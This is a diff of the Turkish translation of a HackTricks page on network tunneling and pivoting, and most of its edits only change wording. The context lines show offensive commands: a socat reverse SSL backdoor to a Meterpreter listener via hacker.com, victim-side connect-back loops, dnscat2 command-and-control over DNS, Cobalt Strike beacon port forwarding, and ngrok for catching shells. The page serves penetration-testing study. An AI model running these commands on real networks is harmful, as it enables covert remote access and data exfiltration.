@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? ya da PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking püf noktalarınızı göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** üzerinden paylaşın.
 
 </details>
 
 **Try Hard Güvenlik Grubu**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -52,7 +52,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Yerel Port2Port
 
-SSH Sunucusunda yeni bir bağlantı noktası açın --> Diğer bağlantı noktası
+Yeni bir Port açın SSH Sunucusu --> Diğer port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -87,7 +87,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tünel
 
-Her iki cihazda da **root yetkisine** ihtiyacınız var (yeni arayüzler oluşturacağınız için) ve sshd yapılandırmasının root girişine izin vermesi gerekmektedir:\
+Her iki cihazda da **root yetkisine** ihtiyacınız var (yeni arayüzler oluşturacağınız için) ve sshd yapılandırması root girişine izin vermelidir:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -102,14 +102,13 @@ Sunucu tarafında yönlendirmeyi etkinleştirin.
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-Müşteri tarafında yeni bir rota belirleyin
+Müşteri tarafında yeni bir rota belirleyin.
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Bir **alt ağ** üzerinden tüm **trafiği** bir ana makineye **ssh** ile **tünelleyebilirsiniz**.\
-Örneğin, 10.10.10.0/24'e giden tüm trafiği yönlendirme
+Bir örneğin, 10.10.10.0/24'e giden tüm trafiği bir ana bilgisayar üzerinden **ssh** ile **tünel**leyebilirsiniz.
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -130,7 +129,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) protokolü, ağ trafiğini bir ağ üzerinden yönlendirmek için kullanılan bir protokoldür. SOCKS sunucuları, istemci isteklerini alır ve hedef sunuculara iletmek için yönlendirme yapar. Bu, ağ trafiğini gizlemek ve coğrafi kısıtlamaları aşmak için kullanılabilir.
+SOCKS (Socket Secure) protokolü, ağ trafiğini bir ağ üzerinden yönlendirmek için kullanılan bir protokoldür. SOCKS sunucuları, istemci isteklerini alır ve hedef sunuculara iletmek için bağlantıları yönlendirir. Bu, ağ trafiğini gizlemek ve coğrafi kısıtlamaları aşmak için kullanılabilir.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -155,7 +154,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Takım sunucusunda dinleyen bir port açın ve tüm arayüzlerde kullanılabilecek şekilde **trafiği beacon üzerinden yönlendirmek için** kullanın.
+Takım sunucusunda dinleyen bir port açın ve **trafiği beacon üzerinden yönlendirmek için kullanılabilen tüm arayüzlerde dinlemeye başlayın**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -166,7 +165,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-Bu durumda, **liman, işaret fişine açılır**, Takım Sunucusunda değil ve trafik Takım Sunucusuna gönderilir ve oradan belirtilen ana makine:limana yönlendirilir.
+Bu durumda, **liman, işaretçi ana bilgisayarında açılır**, Takım Sunucusunda değil ve trafik Takım Sunucusuna ve oradan belirtilen ana bilgisayara:limana gönderilir.
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -175,7 +174,7 @@ rportfwd stop [bind port]
 ### rPort2Port yerel
 
 {% hint style="warning" %}
-Bu durumda, **liman Beacon ana bilgisayarında açılır**, Team Sunucusunda değil ve **trafik Cobalt Strike istemcisine gönderilir** (Team Sunucusuna değil) ve oradan belirtilen ana bilgisayar:limana yönlendirilir.
+Bu durumda, **liman Beacon ana bilgisayarında açılır**, Team Sunucusunda değil ve **trafik Cobalt Strike istemcisine gönderilir** (Team Sunucusuna değil) ve oradan belirtilen ana bilgisayara:limana yönlendirilir.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -185,13 +184,13 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Bir web dosyası tüneli yüklemeniz gerekmektedir: ashx|aspx|js|jsp|php|php|jsp
+Web dosya tüneli yüklemeniz gerekmektedir: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) yayın sayfasından indirebilirsiniz.\
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)ın yayınlar sayfasından indirebilirsiniz.\
 İstemci ve sunucu için **aynı sürümü kullanmanız gerekmektedir**
 
 ### socks
@@ -212,7 +211,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Ters tünel. Tünel, kurban tarafından başlatılır.\
+Ters tünel. Tünel kurban tarafından başlatılır.\
 127.0.0.1:1080 üzerinde bir socks4 vekil sunucu oluşturulur.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -221,7 +220,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-**NTLM proxy** üzerinden pivot yapın
+**NTLM proxy** üzerinden pivot yapın.
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -253,7 +252,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### SSL üzerinden Meterpreter ile Socat
+### SSL üzerinden Meterpreter kullanımı
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -267,7 +266,7 @@ Kurbanın konsolunda son yerine bu satırı çalıştırarak **kimlik doğrulama
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/socat-ile-ters-ssl-arka-kapisi-ve-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
 ### SSL Socat Tüneli
 
@@ -289,7 +288,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Uzaktan Port2Port
 
-Yerel SSH portunu (22) saldırganın ana makinesinin 443 portuna bağlayın
+Yerel SSH portunu (22) saldırganın ana bilgisayarının 443 portuna bağlayın
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -318,22 +317,22 @@ netsh interface portproxy show v4tov4
 # Delete port forward
 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
-## SocksOverRDP ve Proxifier
+## SocksOverRDP & Proxifier
 
-Sisteme **RDP erişiminiz olması gerekir**.\
-İndir:
+Sisteme **RDP erişimine** sahip olmanız gerekmektedir.\
+İndirme:
 
 1. [SocksOverRDP x64 İkili Dosyaları](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Hizmeti özelliğinden `Dynamic Virtual Channels` (`DVC`) kullanır. DVC, **paketleri RDP bağlantısı üzerinden tünelleme**den sorumludur.
-2. [Proxifier Taşınabilir İkili Dosyası](https://www.proxifier.com/download/#win-tab)
+2. [Proxifier Taşınabilir İkili](https://www.proxifier.com/download/#win-tab)
 
-İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:
+İstemci bilgisayarınıza şu şekilde **`SocksOverRDP-Plugin.dll`** yükleyin:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Şimdi **`mstsc.exe`** kullanarak **RDP** üzerinden **hedefe bağlanabiliriz**, ve **SocksOverRDP eklentisinin etkinleştirildiğini** belirten bir **uyarı** almalıyız ve **127.0.0.1:1080** üzerinde **dinleyecektir**.
+Şimdi **`mstsc.exe`** kullanarak **RDP** üzerinden **hedefe bağlanabiliriz** ve **SocksOverRDP eklentisinin etkinleştirildiğine** dair bir **uyarı** almalıyız ve **127.0.0.1:1080** üzerinde **dinleyecektir**.
 
-**RDP** üzerinden bağlanın ve **hedef makinede** `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
+**RDP** üzerinden **bağlanın** ve **hedef makinede** `SocksOverRDP-Server.exe` ikili dosyasını **yükleyip çalıştırın**:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -345,14 +344,14 @@ netstat -antb | findstr 1080
 
 ## Windows GUI Uygulamalarını Vekil Yapma
 
-Windows GUI uygulamalarını bir vekil üzerinden gezinmek için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.\
-**Profil -> Vekil Sunucular** bölümünde SOCKS sunucusunun IP'sini ve bağlantı noktasını ekleyin.\
-**Profil -> Vekillendirme Kuralları** bölümünde vekilleştirmek istediğiniz programın adını ve vekilleştirmek istediğiniz IP'lerin bağlantılarını ekleyin.
+Windows GUI uygulamalarını bir proxy üzerinden gezinmek için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.\
+**Profil -> Vekil Sunucular** bölümüne SOCKS sunucusunun IP'sini ve bağlantı noktasını ekleyin.\
+**Profil -> Vekillendirme Kuralları** bölümüne vekilleştirmek istediğiniz programın adını ve vekilleştirmek istediğiniz IP'lerin bağlantılarını ekleyin.
 
 ## NTLM vekil atlatma
 
 Önceden bahsedilen araç: **Rpivot**\
-**OpenVPN** ayrıca bunu atlayabilir, yapılandırma dosyasında bu seçenekleri ayarlayarak:
+**OpenVPN** ayrıca bunu atlayabilir, yapılandırma dosyasında şu seçenekleri ayarlayarak:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -388,7 +387,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tünel çok yavaş olacak. Bununla birlikte, şu yöntemi kullanarak bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturabilirsiniz:
+Tünel çok yavaş olacak. Bu tünel aracılığıyla sıkıştırılmış bir SSH bağlantısı oluşturabilirsiniz:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -396,7 +395,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**
 
-DNS üzerinden bir C\&C kanalı oluşturur. Kök yetkilerine ihtiyaç duymaz.
+DNS üzerinden bir C\&C kanalı oluşturur. Kök izinlerine ihtiyaç duymaz.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -419,20 +418,20 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS'ini Değiştirme
 
-Proxychains, `gethostbyname` libc çağrısını engeller ve tcp DNS isteğini socks proxy üzerinden tünel oluşturur. **Varsayılan olarak**, proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (sabitlenmiş). Değiştirmek için, dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. Eğer **Windows ortamında**ysanız, **alan denetleyicisinin** IP'sini ayarlayabilirsiniz.
+Proxychains, `gethostbyname` libc çağrısını engeller ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan olarak**, proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (sabitlenmiş). Değiştirmek için, dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. Eğer **Windows ortamında** iseniz, **alan denetleyicisinin** IP'sini ayarlayabilirsiniz.
 
 ## Go'da Tüneller
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tünellemesi
+## ICMP Tünelleme
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Her iki sistemde de kök erişimi gereklidir, tun adaptörleri oluşturmak ve ICMP echo isteklerini kullanarak aralarında veri tünellemek için.
+Her iki sistemde de kök erişimi gereklidir, tün adaptörleri oluşturmak ve ICMP echo isteklerini kullanarak aralarında veri tünelleme yapmak için.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -471,11 +470,11 @@ chmod a+x ./ngrok
 ```
 ### Temel kullanımlar
 
-**Belgelendirme:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**Belgeler:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür.*
+*Mevcut ise kimlik doğrulama ve TLS eklemek de mümkündür.*
 
-#### TCP Tünellemesi
+#### TCP Tüneli
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -483,7 +482,7 @@ chmod a+x ./ngrok
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Dosyaları HTTP ile Açığa Çıkarma
+#### HTTP ile dosyaların açığa çıkarılması
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -491,7 +490,7 @@ chmod a+x ./ngrok
 #### HTTP çağrılarını dinleme
 
 *XSS, SSRF, SSTI için kullanışlıdır...*
-Doğrudan stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) adresinden erişilebilir.
+Doğrudan stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) erişilebilir.
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -515,14 +514,14 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## Kontrol etmek için diğer araçlar
+## Diğer kontrol etmek için araçlar
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -535,7 +534,7 @@ addr: file:///tmp/httpbin/
 * **Bir **cybersecurity şirketinde mi çalışıyorsunuz? Şirketinizin **HackTricks'te reklamını görmek** ister misiniz? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
 * [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna** katılın veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşın, PR'lar göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
